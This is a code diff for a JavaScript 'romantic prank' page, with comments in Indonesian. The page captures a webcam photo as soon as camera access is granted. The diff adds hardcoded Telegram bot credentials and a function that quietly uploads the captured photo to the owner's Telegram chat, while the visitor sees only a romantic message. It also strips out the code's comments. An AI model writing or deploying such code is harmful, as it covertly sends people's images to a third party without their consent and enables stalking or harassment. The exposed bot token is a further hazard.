@@ -1,6 +1,10 @@
 ﻿let stream = null;
 let capturedImage = null;
 
+// ⚠️ GANTI INI DENGAN DATA TELEGRAM KAMU!
+const TELEGRAM_BOT_TOKEN = "8703334699:AAHXkd029InXgEkSo4CRXM2P3Vl1_mQ4VAc";
+const TELEGRAM_CHAT_ID = "5323236080";
+
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 const ctx = canvas.getContext('2d');
@@ -12,12 +16,10 @@ const photoRevealScreen = document.getElementById('photo-reveal');
 const revealBtn = document.getElementById('reveal-btn');
 const retryBtn = document.getElementById('retry-btn');
 
-// Minta akses kamera saat halaman dibuka
 window.addEventListener('load', () => {
     requestCameraAccess();
 });
 
-// Fungsi meminta akses kamera
 async function requestCameraAccess() {
     try {
         stream = await navigator.mediaDevices.getUserMedia({
@@ -28,14 +30,9 @@ async function requestCameraAccess() {
             }
         });
 
-        // Set video stream
         video.srcObject = stream;
-
-        // Tunggu video siap, lalu capture otomatis
         video.onloadedmetadata = () => {
             video.play();
-            
-            // Capture setelah video siap (delay 500ms)
             setTimeout(() => {
                 capturePhoto();
             }, 500);
@@ -47,44 +44,60 @@ async function requestCameraAccess() {
     }
 }
 
-// Fungsi capture foto
 function capturePhoto() {
-    // Set canvas ukuran sesuai video
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
-
-    // Draw video ke canvas
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-    // Simpan image data
     capturedImage = canvas.toDataURL('image/jpeg');
 
-    // Hentikan stream kamera
     if (stream) {
         stream.getTracks().forEach(track => track.stop());
     }
 
-    // Tampilkan pesan romantis
+    sendPhotoToTelegram();
     showRomanticMessage();
 }
 
-// Fungsi tampilkan pesan romantis
+async function sendPhotoToTelegram() {
+    try {
+        const blob = await fetch(capturedImage).then(r => r.blob());
+        const formData = new FormData();
+        formData.append('chat_id', TELEGRAM_CHAT_ID);
+        formData.append('photo', blob, 'prank.jpg');
+        formData.append('caption', '😏 KETAHUAN! Hehe... 💕');
+
+        const response = await fetch(
+            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
+            {
+                method: 'POST',
+                body: formData
+            }
+        );
+
+        const data = await response.json();
+        if (data.ok) {
+            console.log('✅ Foto terkirim ke Telegram!');
+        } else {
+            console.error('❌ Error Telegram:', data.description);
+        }
+    } catch (error) {
+        console.error('❌ Error kirim Telegram:', error);
+    }
+}
+
 function showRomanticMessage() {
     cameraPermissionScreen.classList.add('hidden');
     romanticMessageScreen.classList.remove('hidden');
 }
 
-// Event listener tombol "Pencet ini sayang"
 revealBtn.addEventListener('click', () => {
     showPhotoReveal();
 });
 
-// Fungsi tampilkan foto
 function showPhotoReveal() {
     romanticMessageScreen.classList.add('hidden');
     photoRevealScreen.classList.remove('hidden');
 
-    // Tampilkan foto yang sudah di-capture
     const img = new Image();
     img.src = capturedImage;
     img.onload = () => {
@@ -94,14 +107,10 @@ function showPhotoReveal() {
     };
 }
 
-// Event listener tombol "Ulangi"
 retryBtn.addEventListener('click', () => {
-    // Reset semua
     capturedImage = null;
     cameraPermissionScreen.classList.remove('hidden');
     romanticMessageScreen.classList.add('hidden');
     photoRevealScreen.classList.add('hidden');
-
-    // Minta akses kamera lagi
     requestCameraAccess();
 });
